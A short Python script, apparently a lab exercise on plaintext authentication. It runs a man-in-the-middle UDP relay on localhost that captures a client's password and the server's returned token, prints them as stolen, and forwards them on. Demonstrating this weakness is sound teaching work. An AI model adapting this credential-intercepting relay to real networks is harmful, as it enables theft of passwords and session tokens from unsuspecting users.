import socket
import time
import os
import fcntl


# 3- Plaintext authentication, use MITM to capture stuff
mitmSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
mitmSocket.bind(("127.0.0.1", 23459))
#fcntl.fcntl(mitmSocket, fcntl.F_SETFL, os.O_NONBLOCK)

s_rl = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

while 1:
    # Client authenticates, MITM grabs Client Auth Token
    auth_password, client_addr = mitmSocket.recvfrom(1024)
    print("MITM STOLE", auth_password)

    # MITM captures plaintext password and forwards to server.
    s_rl.sendto(auth_password, ("127.0.0.1", 23456))
    # Give MITM time to send the request and have the token stealing time to complete.
    # time.sleep(1)
    token, real_server_addr = s_rl.recvfrom(1024)
    print("MITM STOLE TOKEN", token, real_server_addr)

    mitmSocket.sendto(token, client_addr)
